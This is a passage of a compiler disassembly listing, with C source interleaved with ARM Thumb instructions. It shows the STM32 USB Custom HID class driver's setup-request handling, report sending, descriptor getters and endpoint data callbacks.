            ((USBD_CUSTOM_HID_ItfTypeDef *)pdev->pUserData[pdev->classId])->CtrlReqComplete(req->bRequest,
                                                                                            req->wLength);
          }
#endif /* USBD_CUSTOMHID_CTRL_REQ_COMPLETE_CALLBACK_ENABLED */
#ifndef USBD_CUSTOMHID_EP0_OUT_PREPARE_RECEIVE_DISABLED
          hhid->IsReportAvailable = 1U;
 800884c:	693b      	ldr	r3, [r7, #16]
 800884e:	2201      	movs	r2, #1
 8008850:	61da      	str	r2, [r3, #28]
          (void)USBD_CtlPrepareRx(pdev, hhid->Report_buf,
 8008852:	6939      	ldr	r1, [r7, #16]
                                  MIN(req->wLength, USBD_CUSTOMHID_OUTREPORT_BUF_SIZE));
 8008854:	683b      	ldr	r3, [r7, #0]
 8008856:	88db      	ldrh	r3, [r3, #6]
 8008858:	2b0f      	cmp	r3, #15
 800885a:	bf28      	it	cs
 800885c:	230f      	movcs	r3, #15
 800885e:	b29b      	uxth	r3, r3
          (void)USBD_CtlPrepareRx(pdev, hhid->Report_buf,
 8008860:	461a      	mov	r2, r3
 8008862:	6878      	ldr	r0, [r7, #4]
 8008864:	f003 fd1a 	bl	800c29c <USBD_CtlPrepareRx>
#endif /* USBD_CUSTOMHID_EP0_OUT_PREPARE_RECEIVE_DISABLED */
          break;
 8008868:	e006      	b.n	8008878 <USBD_CUSTOM_HID_Setup+0xec>
          }
          break;
#endif /* USBD_CUSTOMHID_CTRL_REQ_GET_REPORT_ENABLED */

        default:
          USBD_CtlError(pdev, req);
 800886a:	6839      	ldr	r1, [r7, #0]
 800886c:	6878      	ldr	r0, [r7, #4]
 800886e:	f003 fc78 	bl	800c162 <USBD_CtlError>
          ret = USBD_FAIL;
 8008872:	2303      	movs	r3, #3
 8008874:	75fb      	strb	r3, [r7, #23]
          break;
 8008876:	bf00      	nop
      }
      break;
 8008878:	e09a      	b.n	80089b0 <USBD_CUSTOM_HID_Setup+0x224>

    case USB_REQ_TYPE_STANDARD:
      switch (req->bRequest)
 800887a:	683b      	ldr	r3, [r7, #0]
 800887c:	785b      	ldrb	r3, [r3, #1]
 800887e:	2b0b      	cmp	r3, #11
 8008880:	f200 8086 	bhi.w	8008990 <USBD_CUSTOM_HID_Setup+0x204>
 8008884:	a201      	add	r2, pc, #4	; (adr r2, 800888c <USBD_CUSTOM_HID_Setup+0x100>)
 8008886:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800888a:	bf00      	nop
 800888c:	080088bd 	.word	0x080088bd
 8008890:	0800899f 	.word	0x0800899f
 8008894:	08008991 	.word	0x08008991
 8008898:	08008991 	.word	0x08008991
 800889c:	08008991 	.word	0x08008991
 80088a0:	08008991 	.word	0x08008991
 80088a4:	080088e7 	.word	0x080088e7
 80088a8:	08008991 	.word	0x08008991
 80088ac:	08008991 	.word	0x08008991
 80088b0:	08008991 	.word	0x08008991
 80088b4:	0800893f 	.word	0x0800893f
 80088b8:	08008969 	.word	0x08008969
      {
        case USB_REQ_GET_STATUS:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 80088bc:	687b      	ldr	r3, [r7, #4]
 80088be:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 80088c2:	b2db      	uxtb	r3, r3
 80088c4:	2b03      	cmp	r3, #3
 80088c6:	d107      	bne.n	80088d8 <USBD_CUSTOM_HID_Setup+0x14c>
          {
            (void)USBD_CtlSendData(pdev, (uint8_t *)&status_info, 2U);
 80088c8:	f107 030e 	add.w	r3, r7, #14
 80088cc:	2202      	movs	r2, #2
 80088ce:	4619      	mov	r1, r3
 80088d0:	6878      	ldr	r0, [r7, #4]
 80088d2:	f003 fcb7 	bl	800c244 <USBD_CtlSendData>
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 80088d6:	e063      	b.n	80089a0 <USBD_CUSTOM_HID_Setup+0x214>
            USBD_CtlError(pdev, req);
 80088d8:	6839      	ldr	r1, [r7, #0]
 80088da:	6878      	ldr	r0, [r7, #4]
 80088dc:	f003 fc41 	bl	800c162 <USBD_CtlError>
            ret = USBD_FAIL;
 80088e0:	2303      	movs	r3, #3
 80088e2:	75fb      	strb	r3, [r7, #23]
          break;
 80088e4:	e05c      	b.n	80089a0 <USBD_CUSTOM_HID_Setup+0x214>

        case USB_REQ_GET_DESCRIPTOR:
          if ((req->wValue >> 8) == CUSTOM_HID_REPORT_DESC)
 80088e6:	683b      	ldr	r3, [r7, #0]
 80088e8:	885b      	ldrh	r3, [r3, #2]
 80088ea:	0a1b      	lsrs	r3, r3, #8
 80088ec:	b29b      	uxth	r3, r3
 80088ee:	2b22      	cmp	r3, #34	; 0x22
 80088f0:	d110      	bne.n	8008914 <USBD_CUSTOM_HID_Setup+0x188>
          {
            len = MIN(USBD_CUSTOM_HID_REPORT_DESC_SIZE, req->wLength);
 80088f2:	683b      	ldr	r3, [r7, #0]
 80088f4:	88db      	ldrh	r3, [r3, #6]
 80088f6:	2b49      	cmp	r3, #73	; 0x49
 80088f8:	bf28      	it	cs
 80088fa:	2349      	movcs	r3, #73	; 0x49
 80088fc:	83fb      	strh	r3, [r7, #30]
            pbuf = ((USBD_CUSTOM_HID_ItfTypeDef *)pdev->pUserData[pdev->classId])->pReport;
 80088fe:	687b      	ldr	r3, [r7, #4]
 8008900:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8008904:	687a      	ldr	r2, [r7, #4]
 8008906:	33b0      	adds	r3, #176	; 0xb0
 8008908:	009b      	lsls	r3, r3, #2
 800890a:	4413      	add	r3, r2
 800890c:	685b      	ldr	r3, [r3, #4]
 800890e:	681b      	ldr	r3, [r3, #0]
 8008910:	61bb      	str	r3, [r7, #24]
 8008912:	e00d      	b.n	8008930 <USBD_CUSTOM_HID_Setup+0x1a4>
          }
          else
          {
            if ((req->wValue >> 8) == CUSTOM_HID_DESCRIPTOR_TYPE)
 8008914:	683b      	ldr	r3, [r7, #0]
 8008916:	885b      	ldrh	r3, [r3, #2]
 8008918:	0a1b      	lsrs	r3, r3, #8
 800891a:	b29b      	uxth	r3, r3
 800891c:	2b21      	cmp	r3, #33	; 0x21
 800891e:	d107      	bne.n	8008930 <USBD_CUSTOM_HID_Setup+0x1a4>
            {
              pbuf = USBD_CUSTOM_HID_Desc;
 8008920:	4b26      	ldr	r3, [pc, #152]	; (80089bc <USBD_CUSTOM_HID_Setup+0x230>)
 8008922:	61bb      	str	r3, [r7, #24]
              len = MIN(USB_CUSTOM_HID_DESC_SIZ, req->wLength);
 8008924:	683b      	ldr	r3, [r7, #0]
 8008926:	88db      	ldrh	r3, [r3, #6]
 8008928:	2b09      	cmp	r3, #9
 800892a:	bf28      	it	cs
 800892c:	2309      	movcs	r3, #9
 800892e:	83fb      	strh	r3, [r7, #30]
            }
          }

          (void)USBD_CtlSendData(pdev, pbuf, len);
 8008930:	8bfb      	ldrh	r3, [r7, #30]
 8008932:	461a      	mov	r2, r3
 8008934:	69b9      	ldr	r1, [r7, #24]
 8008936:	6878      	ldr	r0, [r7, #4]
 8008938:	f003 fc84 	bl	800c244 <USBD_CtlSendData>
          break;
 800893c:	e030      	b.n	80089a0 <USBD_CUSTOM_HID_Setup+0x214>

        case USB_REQ_GET_INTERFACE:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800893e:	687b      	ldr	r3, [r7, #4]
 8008940:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 8008944:	b2db      	uxtb	r3, r3
 8008946:	2b03      	cmp	r3, #3
 8008948:	d107      	bne.n	800895a <USBD_CUSTOM_HID_Setup+0x1ce>
          {
            (void)USBD_CtlSendData(pdev, (uint8_t *)&hhid->AltSetting, 1U);
 800894a:	693b      	ldr	r3, [r7, #16]
 800894c:	3318      	adds	r3, #24
 800894e:	2201      	movs	r2, #1
 8008950:	4619      	mov	r1, r3
 8008952:	6878      	ldr	r0, [r7, #4]
 8008954:	f003 fc76 	bl	800c244 <USBD_CtlSendData>
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 8008958:	e022      	b.n	80089a0 <USBD_CUSTOM_HID_Setup+0x214>
            USBD_CtlError(pdev, req);
 800895a:	6839      	ldr	r1, [r7, #0]
 800895c:	6878      	ldr	r0, [r7, #4]
 800895e:	f003 fc00 	bl	800c162 <USBD_CtlError>
            ret = USBD_FAIL;
 8008962:	2303      	movs	r3, #3
 8008964:	75fb      	strb	r3, [r7, #23]
          break;
 8008966:	e01b      	b.n	80089a0 <USBD_CUSTOM_HID_Setup+0x214>

        case USB_REQ_SET_INTERFACE:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 8008968:	687b      	ldr	r3, [r7, #4]
 800896a:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800896e:	b2db      	uxtb	r3, r3
 8008970:	2b03      	cmp	r3, #3
 8008972:	d106      	bne.n	8008982 <USBD_CUSTOM_HID_Setup+0x1f6>
          {
            hhid->AltSetting = (uint8_t)(req->wValue);
 8008974:	683b      	ldr	r3, [r7, #0]
 8008976:	885b      	ldrh	r3, [r3, #2]
 8008978:	b2db      	uxtb	r3, r3
 800897a:	461a      	mov	r2, r3
 800897c:	693b      	ldr	r3, [r7, #16]
 800897e:	619a      	str	r2, [r3, #24]
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 8008980:	e00e      	b.n	80089a0 <USBD_CUSTOM_HID_Setup+0x214>
            USBD_CtlError(pdev, req);
 8008982:	6839      	ldr	r1, [r7, #0]
 8008984:	6878      	ldr	r0, [r7, #4]
 8008986:	f003 fbec 	bl	800c162 <USBD_CtlError>
            ret = USBD_FAIL;
 800898a:	2303      	movs	r3, #3
 800898c:	75fb      	strb	r3, [r7, #23]
          break;
 800898e:	e007      	b.n	80089a0 <USBD_CUSTOM_HID_Setup+0x214>

        case USB_REQ_CLEAR_FEATURE:
          break;

        default:
          USBD_CtlError(pdev, req);
 8008990:	6839      	ldr	r1, [r7, #0]
 8008992:	6878      	ldr	r0, [r7, #4]
 8008994:	f003 fbe5 	bl	800c162 <USBD_CtlError>
          ret = USBD_FAIL;
 8008998:	2303      	movs	r3, #3
 800899a:	75fb      	strb	r3, [r7, #23]
          break;
 800899c:	e000      	b.n	80089a0 <USBD_CUSTOM_HID_Setup+0x214>
          break;
 800899e:	bf00      	nop
      }
      break;
 80089a0:	e006      	b.n	80089b0 <USBD_CUSTOM_HID_Setup+0x224>

    default:
      USBD_CtlError(pdev, req);
 80089a2:	6839      	ldr	r1, [r7, #0]
 80089a4:	6878      	ldr	r0, [r7, #4]
 80089a6:	f003 fbdc 	bl	800c162 <USBD_CtlError>
      ret = USBD_FAIL;
 80089aa:	2303      	movs	r3, #3
 80089ac:	75fb      	strb	r3, [r7, #23]
      break;
 80089ae:	bf00      	nop
  }
  return (uint8_t)ret;
 80089b0:	7dfb      	ldrb	r3, [r7, #23]
}
 80089b2:	4618      	mov	r0, r3
 80089b4:	3720      	adds	r7, #32
 80089b6:	46bd      	mov	sp, r7
 80089b8:	bd80      	pop	{r7, pc}
 80089ba:	bf00      	nop
 80089bc:	20000090 	.word	0x20000090

080089c0 <USBD_CUSTOM_HID_SendReport>:
{
  USBD_CUSTOM_HID_HandleTypeDef *hhid = (USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[ClassId];
#else
uint8_t USBD_CUSTOM_HID_SendReport(USBD_HandleTypeDef *pdev,
                                   uint8_t *report, uint16_t len)
{
 80089c0:	b580      	push	{r7, lr}
 80089c2:	b086      	sub	sp, #24
 80089c4:	af00      	add	r7, sp, #0
 80089c6:	60f8      	str	r0, [r7, #12]
 80089c8:	60b9      	str	r1, [r7, #8]
 80089ca:	4613      	mov	r3, r2
 80089cc:	80fb      	strh	r3, [r7, #6]
  USBD_CUSTOM_HID_HandleTypeDef *hhid = (USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 80089ce:	68fb      	ldr	r3, [r7, #12]
 80089d0:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80089d4:	68fb      	ldr	r3, [r7, #12]
 80089d6:	32b0      	adds	r2, #176	; 0xb0
 80089d8:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 80089dc:	617b      	str	r3, [r7, #20]
#endif /* USE_USBD_COMPOSITE */

  if (hhid == NULL)
 80089de:	697b      	ldr	r3, [r7, #20]
 80089e0:	2b00      	cmp	r3, #0
 80089e2:	d101      	bne.n	80089e8 <USBD_CUSTOM_HID_SendReport+0x28>
  {
    return (uint8_t)USBD_FAIL;
 80089e4:	2303      	movs	r3, #3
 80089e6:	e019      	b.n	8008a1c <USBD_CUSTOM_HID_SendReport+0x5c>
#ifdef USE_USBD_COMPOSITE
  /* Get Endpoint IN address allocated for this class instance */
  CUSTOMHIDInEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_INTR, ClassId);
#endif /* USE_USBD_COMPOSITE */

  if (pdev->dev_state == USBD_STATE_CONFIGURED)
 80089e8:	68fb      	ldr	r3, [r7, #12]
 80089ea:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 80089ee:	b2db      	uxtb	r3, r3
 80089f0:	2b03      	cmp	r3, #3
 80089f2:	d112      	bne.n	8008a1a <USBD_CUSTOM_HID_SendReport+0x5a>
  {
    if (hhid->state == CUSTOM_HID_IDLE)
 80089f4:	697b      	ldr	r3, [r7, #20]
 80089f6:	f893 3020 	ldrb.w	r3, [r3, #32]
 80089fa:	2b00      	cmp	r3, #0
 80089fc:	d10b      	bne.n	8008a16 <USBD_CUSTOM_HID_SendReport+0x56>
    {
      hhid->state = CUSTOM_HID_BUSY;
 80089fe:	697b      	ldr	r3, [r7, #20]
 8008a00:	2201      	movs	r2, #1
 8008a02:	f883 2020 	strb.w	r2, [r3, #32]
      (void)USBD_LL_Transmit(pdev, CUSTOMHIDInEpAdd, report, len);
 8008a06:	4b07      	ldr	r3, [pc, #28]	; (8008a24 <USBD_CUSTOM_HID_SendReport+0x64>)
 8008a08:	7819      	ldrb	r1, [r3, #0]
 8008a0a:	88fb      	ldrh	r3, [r7, #6]
 8008a0c:	68ba      	ldr	r2, [r7, #8]
 8008a0e:	68f8      	ldr	r0, [r7, #12]
 8008a10:	f004 f9ea 	bl	800cde8 <USBD_LL_Transmit>
 8008a14:	e001      	b.n	8008a1a <USBD_CUSTOM_HID_SendReport+0x5a>
    }
    else
    {
      return (uint8_t)USBD_BUSY;
 8008a16:	2301      	movs	r3, #1
 8008a18:	e000      	b.n	8008a1c <USBD_CUSTOM_HID_SendReport+0x5c>
    }
  }
  return (uint8_t)USBD_OK;
 8008a1a:	2300      	movs	r3, #0
}
 8008a1c:	4618      	mov	r0, r3
 8008a1e:	3718      	adds	r7, #24
 8008a20:	46bd      	mov	sp, r7
 8008a22:	bd80      	pop	{r7, pc}
 8008a24:	200000a6 	.word	0x200000a6

08008a28 <USBD_CUSTOM_HID_GetFSCfgDesc>:
  * @param  speed : current device speed
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
static uint8_t *USBD_CUSTOM_HID_GetFSCfgDesc(uint16_t *length)
{
 8008a28:	b580      	push	{r7, lr}
 8008a2a:	b084      	sub	sp, #16
 8008a2c:	af00      	add	r7, sp, #0
 8008a2e:	6078      	str	r0, [r7, #4]
  USBD_EpDescTypeDef *pEpInDesc = USBD_GetEpDesc(USBD_CUSTOM_HID_CfgDesc, CUSTOM_HID_EPIN_ADDR);
 8008a30:	2181      	movs	r1, #129	; 0x81
 8008a32:	4815      	ldr	r0, [pc, #84]	; (8008a88 <USBD_CUSTOM_HID_GetFSCfgDesc+0x60>)
 8008a34:	f002 fd32 	bl	800b49c <USBD_GetEpDesc>
 8008a38:	60f8      	str	r0, [r7, #12]
  USBD_EpDescTypeDef *pEpOutDesc = USBD_GetEpDesc(USBD_CUSTOM_HID_CfgDesc, CUSTOM_HID_EPOUT_ADDR);
 8008a3a:	2101      	movs	r1, #1
 8008a3c:	4812      	ldr	r0, [pc, #72]	; (8008a88 <USBD_CUSTOM_HID_GetFSCfgDesc+0x60>)
 8008a3e:	f002 fd2d 	bl	800b49c <USBD_GetEpDesc>
 8008a42:	60b8      	str	r0, [r7, #8]

  if (pEpInDesc != NULL)
 8008a44:	68fb      	ldr	r3, [r7, #12]
 8008a46:	2b00      	cmp	r3, #0
 8008a48:	d009      	beq.n	8008a5e <USBD_CUSTOM_HID_GetFSCfgDesc+0x36>
  {
    pEpInDesc->wMaxPacketSize = CUSTOM_HID_EPIN_SIZE;
 8008a4a:	68fb      	ldr	r3, [r7, #12]
 8008a4c:	2200      	movs	r2, #0
 8008a4e:	f042 0202 	orr.w	r2, r2, #2
 8008a52:	711a      	strb	r2, [r3, #4]
 8008a54:	2200      	movs	r2, #0
 8008a56:	715a      	strb	r2, [r3, #5]
    pEpInDesc->bInterval = CUSTOM_HID_FS_BINTERVAL;
 8008a58:	68fb      	ldr	r3, [r7, #12]
 8008a5a:	2205      	movs	r2, #5
 8008a5c:	719a      	strb	r2, [r3, #6]
  }

  if (pEpOutDesc != NULL)
 8008a5e:	68bb      	ldr	r3, [r7, #8]
 8008a60:	2b00      	cmp	r3, #0
 8008a62:	d009      	beq.n	8008a78 <USBD_CUSTOM_HID_GetFSCfgDesc+0x50>
  {
    pEpOutDesc->wMaxPacketSize = CUSTOM_HID_EPOUT_SIZE;
 8008a64:	68bb      	ldr	r3, [r7, #8]
 8008a66:	2200      	movs	r2, #0
 8008a68:	f042 0202 	orr.w	r2, r2, #2
 8008a6c:	711a      	strb	r2, [r3, #4]
 8008a6e:	2200      	movs	r2, #0
 8008a70:	715a      	strb	r2, [r3, #5]
    pEpOutDesc->bInterval = CUSTOM_HID_FS_BINTERVAL;
 8008a72:	68bb      	ldr	r3, [r7, #8]
 8008a74:	2205      	movs	r2, #5
 8008a76:	719a      	strb	r2, [r3, #6]
  }

  *length = (uint16_t)sizeof(USBD_CUSTOM_HID_CfgDesc);
 8008a78:	687b      	ldr	r3, [r7, #4]
 8008a7a:	2229      	movs	r2, #41	; 0x29
 8008a7c:	801a      	strh	r2, [r3, #0]
  return USBD_CUSTOM_HID_CfgDesc;
 8008a7e:	4b02      	ldr	r3, [pc, #8]	; (8008a88 <USBD_CUSTOM_HID_GetFSCfgDesc+0x60>)
}
 8008a80:	4618      	mov	r0, r3
 8008a82:	3710      	adds	r7, #16
 8008a84:	46bd      	mov	sp, r7
 8008a86:	bd80      	pop	{r7, pc}
 8008a88:	20000064 	.word	0x20000064

08008a8c <USBD_CUSTOM_HID_GetHSCfgDesc>:
  * @param  speed : current device speed
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
static uint8_t *USBD_CUSTOM_HID_GetHSCfgDesc(uint16_t *length)
{
 8008a8c:	b580      	push	{r7, lr}
 8008a8e:	b084      	sub	sp, #16
 8008a90:	af00      	add	r7, sp, #0
 8008a92:	6078      	str	r0, [r7, #4]
  USBD_EpDescTypeDef *pEpInDesc = USBD_GetEpDesc(USBD_CUSTOM_HID_CfgDesc, CUSTOM_HID_EPIN_ADDR);
 8008a94:	2181      	movs	r1, #129	; 0x81
 8008a96:	4815      	ldr	r0, [pc, #84]	; (8008aec <USBD_CUSTOM_HID_GetHSCfgDesc+0x60>)
 8008a98:	f002 fd00 	bl	800b49c <USBD_GetEpDesc>
 8008a9c:	60f8      	str	r0, [r7, #12]
  USBD_EpDescTypeDef *pEpOutDesc = USBD_GetEpDesc(USBD_CUSTOM_HID_CfgDesc, CUSTOM_HID_EPOUT_ADDR);
 8008a9e:	2101      	movs	r1, #1
 8008aa0:	4812      	ldr	r0, [pc, #72]	; (8008aec <USBD_CUSTOM_HID_GetHSCfgDesc+0x60>)
 8008aa2:	f002 fcfb 	bl	800b49c <USBD_GetEpDesc>
 8008aa6:	60b8      	str	r0, [r7, #8]

  if (pEpInDesc != NULL)
 8008aa8:	68fb      	ldr	r3, [r7, #12]
 8008aaa:	2b00      	cmp	r3, #0
 8008aac:	d009      	beq.n	8008ac2 <USBD_CUSTOM_HID_GetHSCfgDesc+0x36>
  {
    pEpInDesc->wMaxPacketSize = CUSTOM_HID_EPIN_SIZE;
 8008aae:	68fb      	ldr	r3, [r7, #12]
 8008ab0:	2200      	movs	r2, #0
 8008ab2:	f042 0202 	orr.w	r2, r2, #2
 8008ab6:	711a      	strb	r2, [r3, #4]
 8008ab8:	2200      	movs	r2, #0
 8008aba:	715a      	strb	r2, [r3, #5]
    pEpInDesc->bInterval = CUSTOM_HID_HS_BINTERVAL;
 8008abc:	68fb      	ldr	r3, [r7, #12]
 8008abe:	2205      	movs	r2, #5
 8008ac0:	719a      	strb	r2, [r3, #6]
  }

  if (pEpOutDesc != NULL)
 8008ac2:	68bb      	ldr	r3, [r7, #8]
 8008ac4:	2b00      	cmp	r3, #0
 8008ac6:	d009      	beq.n	8008adc <USBD_CUSTOM_HID_GetHSCfgDesc+0x50>
  {
    pEpOutDesc->wMaxPacketSize = CUSTOM_HID_EPOUT_SIZE;
 8008ac8:	68bb      	ldr	r3, [r7, #8]
 8008aca:	2200      	movs	r2, #0
 8008acc:	f042 0202 	orr.w	r2, r2, #2
 8008ad0:	711a      	strb	r2, [r3, #4]
 8008ad2:	2200      	movs	r2, #0
 8008ad4:	715a      	strb	r2, [r3, #5]
    pEpOutDesc->bInterval = CUSTOM_HID_HS_BINTERVAL;
 8008ad6:	68bb      	ldr	r3, [r7, #8]
 8008ad8:	2205      	movs	r2, #5
 8008ada:	719a      	strb	r2, [r3, #6]
  }

  *length = (uint16_t)sizeof(USBD_CUSTOM_HID_CfgDesc);
 8008adc:	687b      	ldr	r3, [r7, #4]
 8008ade:	2229      	movs	r2, #41	; 0x29
 8008ae0:	801a      	strh	r2, [r3, #0]
  return USBD_CUSTOM_HID_CfgDesc;
 8008ae2:	4b02      	ldr	r3, [pc, #8]	; (8008aec <USBD_CUSTOM_HID_GetHSCfgDesc+0x60>)
}
 8008ae4:	4618      	mov	r0, r3
 8008ae6:	3710      	adds	r7, #16
 8008ae8:	46bd      	mov	sp, r7
 8008aea:	bd80      	pop	{r7, pc}
 8008aec:	20000064 	.word	0x20000064

08008af0 <USBD_CUSTOM_HID_GetOtherSpeedCfgDesc>:
  * @param  speed : current device speed
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
static uint8_t *USBD_CUSTOM_HID_GetOtherSpeedCfgDesc(uint16_t *length)
{
 8008af0:	b580      	push	{r7, lr}
 8008af2:	b084      	sub	sp, #16
 8008af4:	af00      	add	r7, sp, #0
 8008af6:	6078      	str	r0, [r7, #4]
  USBD_EpDescTypeDef *pEpInDesc = USBD_GetEpDesc(USBD_CUSTOM_HID_CfgDesc, CUSTOM_HID_EPIN_ADDR);
 8008af8:	2181      	movs	r1, #129	; 0x81
 8008afa:	4815      	ldr	r0, [pc, #84]	; (8008b50 <USBD_CUSTOM_HID_GetOtherSpeedCfgDesc+0x60>)
 8008afc:	f002 fcce 	bl	800b49c <USBD_GetEpDesc>
 8008b00:	60f8      	str	r0, [r7, #12]
  USBD_EpDescTypeDef *pEpOutDesc = USBD_GetEpDesc(USBD_CUSTOM_HID_CfgDesc, CUSTOM_HID_EPOUT_ADDR);
 8008b02:	2101      	movs	r1, #1
 8008b04:	4812      	ldr	r0, [pc, #72]	; (8008b50 <USBD_CUSTOM_HID_GetOtherSpeedCfgDesc+0x60>)
 8008b06:	f002 fcc9 	bl	800b49c <USBD_GetEpDesc>
 8008b0a:	60b8      	str	r0, [r7, #8]

  if (pEpInDesc != NULL)
 8008b0c:	68fb      	ldr	r3, [r7, #12]
 8008b0e:	2b00      	cmp	r3, #0
 8008b10:	d009      	beq.n	8008b26 <USBD_CUSTOM_HID_GetOtherSpeedCfgDesc+0x36>
  {
    pEpInDesc->wMaxPacketSize = CUSTOM_HID_EPIN_SIZE;
 8008b12:	68fb      	ldr	r3, [r7, #12]
 8008b14:	2200      	movs	r2, #0
 8008b16:	f042 0202 	orr.w	r2, r2, #2
 8008b1a:	711a      	strb	r2, [r3, #4]
 8008b1c:	2200      	movs	r2, #0
 8008b1e:	715a      	strb	r2, [r3, #5]
    pEpInDesc->bInterval = CUSTOM_HID_FS_BINTERVAL;
 8008b20:	68fb      	ldr	r3, [r7, #12]
 8008b22:	2205      	movs	r2, #5
 8008b24:	719a      	strb	r2, [r3, #6]
  }

  if (pEpOutDesc != NULL)
 8008b26:	68bb      	ldr	r3, [r7, #8]
 8008b28:	2b00      	cmp	r3, #0
 8008b2a:	d009      	beq.n	8008b40 <USBD_CUSTOM_HID_GetOtherSpeedCfgDesc+0x50>
  {
    pEpOutDesc->wMaxPacketSize = CUSTOM_HID_EPOUT_SIZE;
 8008b2c:	68bb      	ldr	r3, [r7, #8]
 8008b2e:	2200      	movs	r2, #0
 8008b30:	f042 0202 	orr.w	r2, r2, #2
 8008b34:	711a      	strb	r2, [r3, #4]
 8008b36:	2200      	movs	r2, #0
 8008b38:	715a      	strb	r2, [r3, #5]
    pEpOutDesc->bInterval = CUSTOM_HID_FS_BINTERVAL;
 8008b3a:	68bb      	ldr	r3, [r7, #8]
 8008b3c:	2205      	movs	r2, #5
 8008b3e:	719a      	strb	r2, [r3, #6]
  }

  *length = (uint16_t)sizeof(USBD_CUSTOM_HID_CfgDesc);
 8008b40:	687b      	ldr	r3, [r7, #4]
 8008b42:	2229      	movs	r2, #41	; 0x29
 8008b44:	801a      	strh	r2, [r3, #0]
  return USBD_CUSTOM_HID_CfgDesc;
 8008b46:	4b02      	ldr	r3, [pc, #8]	; (8008b50 <USBD_CUSTOM_HID_GetOtherSpeedCfgDesc+0x60>)
}
 8008b48:	4618      	mov	r0, r3
 8008b4a:	3710      	adds	r7, #16
 8008b4c:	46bd      	mov	sp, r7
 8008b4e:	bd80      	pop	{r7, pc}
 8008b50:	20000064 	.word	0x20000064

08008b54 <USBD_CUSTOM_HID_DataIn>:
  * @param  pdev: device instance
  * @param  epnum: endpoint index
  * @retval status
  */
static uint8_t USBD_CUSTOM_HID_DataIn(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 8008b54:	b480      	push	{r7}
 8008b56:	b083      	sub	sp, #12
 8008b58:	af00      	add	r7, sp, #0
 8008b5a:	6078      	str	r0, [r7, #4]
 8008b5c:	460b      	mov	r3, r1
 8008b5e:	70fb      	strb	r3, [r7, #3]
  UNUSED(epnum);

  /* Ensure that the FIFO is empty before a new transfer, this condition could
  be caused by  a new transfer before the end of the previous transfer */
  ((USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId])->state = CUSTOM_HID_IDLE;
 8008b60:	687b      	ldr	r3, [r7, #4]
 8008b62:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008b66:	687b      	ldr	r3, [r7, #4]
 8008b68:	32b0      	adds	r2, #176	; 0xb0
 8008b6a:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008b6e:	2200      	movs	r2, #0
 8008b70:	f883 2020 	strb.w	r2, [r3, #32]

  return (uint8_t)USBD_OK;
 8008b74:	2300      	movs	r3, #0
}
 8008b76:	4618      	mov	r0, r3
 8008b78:	370c      	adds	r7, #12
 8008b7a:	46bd      	mov	sp, r7
 8008b7c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8008b80:	4770      	bx	lr

08008b82 <USBD_CUSTOM_HID_DataOut>:
  * @param  pdev: device instance
  * @param  epnum: endpoint index
  * @retval status
  */
static uint8_t USBD_CUSTOM_HID_DataOut(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 8008b82:	b580      	push	{r7, lr}
 8008b84:	b084      	sub	sp, #16
 8008b86:	af00      	add	r7, sp, #0
 8008b88:	6078      	str	r0, [r7, #4]
 8008b8a:	460b      	mov	r3, r1
 8008b8c:	70fb      	strb	r3, [r7, #3]
  UNUSED(epnum);
  USBD_CUSTOM_HID_HandleTypeDef *hhid;

  if (pdev->pClassDataCmsit[pdev->classId] == NULL)
 8008b8e:	687b      	ldr	r3, [r7, #4]
 8008b90:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008b94:	687b      	ldr	r3, [r7, #4]
 8008b96:	32b0      	adds	r2, #176	; 0xb0
 8008b98:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008b9c:	2b00      	cmp	r3, #0
 8008b9e:	d101      	bne.n	8008ba4 <USBD_CUSTOM_HID_DataOut+0x22>
  {
    return (uint8_t)USBD_FAIL;
 8008ba0:	2303      	movs	r3, #3
 8008ba2:	e017      	b.n	8008bd4 <USBD_CUSTOM_HID_DataOut+0x52>
  }

  hhid = (USBD_CUSTOM_HID_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8008ba4:	687b      	ldr	r3, [r7, #4]
 8008ba6:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8008baa:	687b      	ldr	r3, [r7, #4]
 8008bac:	32b0      	adds	r2, #176	; 0xb0
 8008bae:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8008bb2:	60fb      	str	r3, [r7, #12]

  /* USB data will be immediately processed, this allow next USB traffic being
  NAKed till the end of the application processing */
  ((USBD_CUSTOM_HID_ItfTypeDef *)pdev->pUserData[pdev->classId])->OutEvent(hhid->Report_buf[0],
 8008bb4:	687b      	ldr	r3, [r7, #4]
 8008bb6:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8008bba:	687a      	ldr	r2, [r7, #4]
 8008bbc:	33b0      	adds	r3, #176	; 0xb0
 8008bbe:	009b      	lsls	r3, r3, #2
 8008bc0:	4413      	add	r3, r2
